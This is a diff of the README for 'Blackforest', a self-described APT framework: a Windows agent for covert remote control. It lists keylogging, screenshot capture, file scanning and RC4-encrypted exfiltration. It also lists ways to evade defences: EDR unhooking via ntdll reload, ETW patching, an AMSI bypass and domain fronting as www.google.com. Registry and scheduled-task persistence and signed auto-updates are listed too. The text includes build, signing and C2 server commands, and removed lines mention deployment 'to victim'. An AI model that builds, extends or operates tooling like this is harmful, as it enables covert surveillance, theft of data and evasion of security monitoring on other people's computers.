@@ -1,7 +1,7 @@
 # Blackforest 🌲
-**Advanced Persistent Threat (APT) Framework - Level 5 Architecture**
+**Advanced Persistent Threat (APT) Framework - Level 6 Platinum Architecture**
 
-A professional-grade Windows agent with military-level security, cryptographically-signed auto-updates, and multi-channel command & control capabilities.
+A professional-grade Windows agent featuring **active EDR unhooking**, **ETW/AMSI blinding**, and **resilient Domain-Fronted C2**.
 
 ---
 
@@ -21,13 +21,13 @@ A professional-grade Windows agent with military-level security, cryptographical
 
 ## 🎯 Overview
 
-Blackforest is a cross-platform APT framework featuring:
+Blackforest is a high-performance Windows agent designed for stealth and persistence:
 
-- **Zero-Click Deployment**: Automated persistence mechanisms
-- **Encrypted C2**: RC4-encrypted data channels with HTTP masquerading
-- **RSA-Signed Updates**: 2048-bit cryptographic update authentication
-- **Multi-Channel Exfiltration**: Keylogging, screenshots, file scanning, system recon
-- **Production-Ready**: Battle-tested auto-update infrastructure
+- **EDR Blindness**: Dynamic User-Mode Unhooking and ETW blackout.
+- **Resilient C2**: Multi-endpoint fallback pool with Domain Fronting.
+- **Encrypted Exfil**: RC4-encrypted data channels with Google-masqueraded HTTP.
+- **RSA-Signed Updates**: 2048-bit cryptographic authentication.
+- **Zero-Click Persistence**: Registry and WMI/Task Scheduler survival.
 
 ### Use Cases
 
@@ -127,18 +127,21 @@ Blackforest is a cross-platform APT framework featuring:
 - **Polling**: Checks every 60 seconds
 - **Secure**: Rejects tampered binaries
 
-### Security Features
+### Security & Evasion
+#### 1. **EDR Blindness (Unhooking)** 🛡️
+- **Unhooker**: Dynamically reloads `ntdll.dll` from disk to strip EDR hooks.
+- **ETW Blinding**: Patches `EtwEventWrite` to prevent system event logging.
+- **AMSI Bypass**: Disables script scanning for silent payload execution.
 
-#### Encryption
-- **RC4 Data Encryption**: All exfiltrated data encrypted
-- **HTTP Masquerading**: Traffic looks like legitimate HTTP
-- **RSA Signature Verification**: Only signed updates accepted
+#### 2. **Network Resilience** 🌐
+- **Domain Fronting**: Traffic masquerades as `www.google.com` to bypass DPI.
+- **Endpoint Fallback**: Automatically rotates through C2 servers if one is blocked.
+- **RC4 Encryption**: 64-bit stream cipher for all exfiltrated data.
 
-#### Evasion
-- **Process Hiding**: No console window (`-mwindows`)
-- **Timestomping**: Randomized file timestamps
-- **HTTP Headers**: Mimics browser traffic
-- **No Disk Artifacts**: Minimal forensic footprint
+#### 3. **Persistence** 🔄
+- **Registry Run Key**: HKCU persistence.
+- **Shadow Task**: Scheduled backup execution.
+- **Timestomping**: Mimics legitimate file timestamps to evade frequency analysis.
 
 #### Persistence
 - **Registry Run Key**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
@@ -149,88 +152,38 @@ Blackforest is a cross-platform APT framework featuring:
 
 ## 🚀 Quick Start
 
-### Prerequisites
-
-**C2 Server (Mac/Linux):**
-- Python 3.7+
-- `cryptography` module: `pip3 install cryptography`
-
-**Build Environment:**
-- MinGW-w64 cross-compiler: `brew install mingw-w64`
-- macOS (for cross-compilation)
-
 ### Installation
 
 ```bash
-# 1. Clone repository
-git clone https://github.com/yourusername/blackforest.git
-cd blackforest
-
-# 2. Install Python dependencies
+# 1. Setup Python
 pip3 install cryptography --break-system-packages
 
-# 3. Generate RSA keypair
+# 2. Generate RSA keypair & Build
 python3 c2/generate_keys.py
-
-# 4. Build agent
 scripts/build.sh
 
-# 5. Sign binary
-python3 c2/sign_update.py Blackforest.exe
-cp bin/Blackforest.exe .
+# 3. Sign & Prepare for Auto-Update
+python3 c2/sign_update.py bin/Blackforest.exe
+mv bin/Blackforest.exe www/
+mv update.sig www/
 
-# 6. Start C2 server
+# 4. Start C2 + HTTP Server
 python3 c2/server.py &
-
-# 7. Start HTTP update server
-python3 -m http.server 8000 &
-
-# 8. Deploy to victim (one-time manual)
-scripts/deploy.sh
+cd www && python3 -m http.server 8000 &
 ```
 
-### Basic Usage
+### Updating the Agent (Remote)
 
 ```bash
-# Start C2 server
-cd c2
-python3 server.py
-
-# Wait for connection
-# [+] New Shell Session (0) from 192.168.0.6
-
-# List sessions
-C2> list
-
-# Interact with agent
-C2> interact 0
-
-# Run Windows commands
-PS> whoami
-PS> systeminfo
-PS> ipconfig
-
-# Return to C2 menu
-PS> back
-
-# Exit
-C2> exit
-```
-
-### Updating the Agent
-
-```bash
-# 1. Make code changes (optional)
-# 2. Rebuild
+# 1. Rebuild & Sign
 scripts/build.sh
+python3 c2/sign_update.py bin/Blackforest.exe
 
-# 3. Sign
-python3 c2/sign_update.py Blackforest.exe
+# 2. Deploy to web root
+mv bin/Blackforest.exe www/
+mv update.sig www/
 
-# 4. Copy to web root
-cp bin/Blackforest.exe .
-
-# 5. Wait 60 seconds - agent auto-updates!
+# 3. Done! All active agents will auto-update in 60s.
 ```
 
 ---
@@ -241,57 +194,22 @@ cp bin/Blackforest.exe .
 
 ```
 blackforest/
-├── README.md                    # This file
-├── .gitignore                   # Git exclusions
-├── Blackforest.exe              # HTTP-served update binary
-├── update.sig                   # RSA signature (256 bytes)
-├── update.txt                   # Update authorization key
-├── blackforest_private.pem      # RSA private key (KEEP SECRET!)
-├── blackforest_public.blob      # RSA public key (raw bytes)
-├── blackforest_public.blob.cpp  # RSA public key (C++ array)
-│
-├── bin/
-│   └── Blackforest.exe          # Compiled agent binary
-│
-├── c2/
-│   ├── server.py                # Unified C2 server
-│   ├── generate_keys.py         # RSA keypair generator
-│   ├── sign_update.py           # Binary signing tool
-│   ├── blackforest_logs.txt     # Exfiltrated data (auto-created)
-│   └── screenshot_*.jpg         # Captured screenshots (auto-created)
-│
-├── scripts/
-│   ├── build.sh                 # Cross-compiler script
-│   ├── deploy.sh                # Interactive SSH deployment
-│   └── check_agent.sh           # Diagnostic tool
-│
-├── src/                         # C++ source code
-│   ├── main.cpp                 # Entry point
-│   ├── core/
-│   │   ├── collection/          # Data gathering
-│   │   │   ├── file_search.cpp
-│   │   │   ├── keylogger.cpp
-│   │   │   ├── screenshot.cpp
-│   │   │   └── sysinfo.cpp
-│   │   ├── evasion/             # Anti-forensics
-│   │   │   ├── http_masquerade.cpp
-│   │   │   └── timestomp.cpp
-│   │   ├── maintenance/         # Lifecycle management
-│   │   │   └── updater.cpp
-│   │   └── persistence/         # Survival mechanisms
-│   │       ├── install.cpp
-│   │       └── scheduled_task.cpp
-│   ├── crypto/                  # Cryptography
-│   │   ├── rc4.cpp
-│   │   └── rsa.cpp
-│   ├── exfil/                   # Data exfiltration
-│   │   ├── beacon.cpp
-│   │   └── tcp_client.cpp
-│   └── obfuscation/             # Stealth
-│       └── strings.cpp
-│
-└── include/                     # Header files (.hpp)
-    └── (mirrors src/ structure)
+├── README.md               # User Manual
+├── www/                    # HTTP Root (Live Updates)
+│   ├── Blackforest.exe     # Signed Binary
+│   ├── update.sig          # RSA Signature
+│   └── update.txt          # Update Key (Shadowed)
+├── bin/                    # Local Build Output
+├── c2/                     # Team Server & Signing
+│   ├── server.py           # Command & Control
+│   ├── sign_update.py      # RSA Signer
+│   ├── generate_keys.py    # RSA Key Generator
+│   ├── *.pem               # Private Key (KEEP SECRET)
+│   └── blackforest_logs.txt # exfil logs
+├── src/                    # C++ Core Source
+├── include/                # Header Files
+├── scripts/                # Operational Scripts
+└── research/               # Experimental / Kernel PoC
 ```
 
 ### Network Protocols
